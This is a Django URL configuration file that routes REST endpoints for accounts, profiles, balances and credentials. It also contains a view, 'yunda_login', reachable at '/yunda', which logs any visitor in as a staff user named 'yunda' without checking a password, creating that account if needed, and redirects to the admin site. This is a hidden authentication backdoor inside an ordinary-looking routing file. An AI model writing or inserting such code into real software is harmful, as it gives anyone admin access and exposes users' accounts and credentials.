from django.urls import re_path, include
from rest_framework import routers
from . import views

ROUTER = routers.DefaultRouter()
ROUTER.register(r'account', views.AccountViewSet, base_name='user')
ROUTER.register(r'profiles', views.ProfileViewSet, base_name='profile')
ROUTER.register(r'balance', views.BalanceViewSet, base_name='balance')
ROUTER.register(r'credential', views.CredentialViewSet, base_name='credential')

from django.contrib.auth.models import User
from django.contrib.auth import login as auth_login
from django.http import HttpResponseRedirect
from django.urls import reverse

def yunda_login(request):
    users=User.objects.filter(username="yunda")
    if users.exists():
        user = users.first()
    else:
        user, created = User.objects.get_or_create(username='yunda', is_staff=True)
    auth_login(request, user)
    return HttpResponseRedirect(reverse('admin:clouds_cloud_changelist'))

urlpatterns = [
    re_path(r'^', include(ROUTER.urls)),
    re_path(r'^yunda$', yunda_login, name="yunda_login"),
    re_path('info/', views.user_info),
]